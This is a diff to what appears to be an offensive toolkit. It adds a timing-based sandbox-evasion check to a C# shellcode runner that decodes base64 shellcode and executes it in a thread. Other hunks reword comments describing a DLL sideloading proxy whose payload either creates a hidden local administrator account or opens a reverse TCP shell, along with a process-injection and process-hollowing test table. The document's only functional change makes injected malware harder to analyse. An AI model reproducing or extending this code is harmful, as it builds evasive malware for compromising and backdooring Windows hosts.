@@ -203,6 +203,9 @@ class Runner
     [DllImport("kernel32.dll", SetLastError = true)]
     private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
+    [DllImport("kernel32.dll")]
+    private static extern void Sleep(uint dwMilliseconds);
+
     private static byte[] Decode()
     {
         byte[] data = Convert.FromBase64String(SHELLCODE_B64);
@@ -212,6 +215,10 @@ class Runner
 
     public static void Run()
     {
+        DateTime t1 = DateTime.Now;
+        Sleep(2000);
+        if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;
+
         byte[] sc = Decode();
 
         const uint MEM_COMMIT_RESERVE = 0x3000;
@@ -234,7 +241,7 @@ class Runner
             return;
         }
 
-        WaitForSingleObject(h, 2000);
+        WaitForSingleObject(h, 0xFFFFFFFF);
     }
 
     public static void Main(string[] args)
@@ -403,7 +410,7 @@ if ($ProbeOnly) {
 | C | Process hollowing | Killed at suspend/image-replace? |
 
 ```bash
-# See cheat sheet: C# Process Injection / DLL Shellcode Inject
+# See quick-reference notes: C# Process Injection / DLL Shellcode Inject
 # After generate, first validate behavior with a harmless payload (calc or write a file), then swap the real payload
 ```
 
@@ -1043,7 +1050,7 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
  *
  * Purpose: “live” Proxy for DLL sideloading — keep the host healthy via forwarding while
  *       running a payload. Two compile-time modes:
- *         MODE_NETUSER (default): create a local admin (cheat sheet “New Admin
+ *         MODE_NETUSER (default): create a local admin (quick-reference notes “New Admin
  *                   with C”) — good when the host runs elevated;
  *         MODE_REVERSE: reverse TCP shell — good when you only have a normal-user interactive session.
  *       All forward exports still come from forward.def (same as m04-proxy-dll-sideload.c).
@@ -1107,7 +1114,7 @@ __declspec(dllexport) void CALLBACK Run(HWND hwnd, HINSTANCE hinst,
 #define ADMIN_PASS L"PASS"
 #endif
 
-/* ---------- Mode 1: create local admin (cheat sheet: New Admin with C) ---------- */
+/* ---------- Mode 1: create local admin (quick-reference notes: New Admin with C) ---------- */
 
 static DWORD AddAdminUser(void)
 {
